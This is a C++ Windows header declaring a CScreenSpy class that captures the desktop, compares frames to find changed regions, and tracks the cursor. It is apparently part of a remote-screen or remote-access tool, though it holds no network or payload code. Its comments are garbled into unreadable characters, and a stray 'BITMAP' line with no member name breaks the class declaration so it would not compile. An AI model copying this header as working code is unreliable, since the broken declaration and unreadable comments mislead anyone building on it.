#pragma once

#include <windows.h>
#include "CursorInfo.h"

// �����㷨
#define ALGORITHM_SCAN	1	// �ٶȺܿ죬����Ƭ̫��
#define ALGORITHM_DIFF	2	// �ٶȺ�����ҲռCPU������������������С��

class CScreenSpy  
{
public:
	CScreenSpy(int biBitCount= 8, bool bIsGray= false, UINT nMaxFrameRate = 100);
	virtual ~CScreenSpy();

	LPVOID getFirstScreen();
	LPVOID getNextScreen(LPDWORD lpdwBytes);

	LPBITMAPINFO getBI();
	BITMAP 
	UINT	getBISize();
	UINT	getFirstImageSize();
	void	setCaptureLayer(bool bIsCaptureLayer);
	void setAlgorithm(UINT nAlgorithm);

private:
	void ScanScreen(HDC hdcDest, HDC hdcSrc, int nWidth, int nHeight); // ����CPU
	int Compare(LPBYTE lpSource, LPBYTE lpDest, LPBYTE lpBuffer, DWORD dwSize);
	LPBITMAPINFO ConstructBI(int biBitCount, int biWidth, int biHeight);
	void WriteRectBuffer(LPBYTE	lpData, int nCount);
	bool ScanChangedRect(int nStartLine);
	void CopyRect(LPRECT lpRect);
	bool SelectInputWinStation();

	BYTE m_byAlgorithm;
	UINT m_nMaxFrameRate;
	bool m_bIsGray;
	DWORD m_dwBitBltRop;
	DWORD m_dwLastCapture;
	DWORD m_dwSleep;
	LPBYTE m_rectBuffer;
	UINT m_rectBufferOffset;
	BYTE m_nIncSize;
	int m_nFullWidth, m_nFullHeight, m_nStartLine;
	RECT m_changeRect;
	HDC m_hFullDC, m_hLineMemDC, m_hFullMemDC, m_hRectMemDC;
	
	HBITMAP m_hLineBitmap, m_hFullBitmap;
	LPVOID m_lpvLineBits, m_lpvFullBits;
	LPBITMAPINFO m_lpbmi_line, m_lpbmi_full, m_lpbmi_rect;
	
	int	m_nbiBitCount;
	int	m_nDataSizePerLine;

	LPVOID m_lpvDiffBits; // ����Ƚϵ���һ��
	HDC	m_hDiffDC, m_hDiffMemDC;
	HBITMAP	m_hDiffBitmap;

	CCursorInfo	m_CursorInfo;
	HWND m_hDeskTopWnd;
};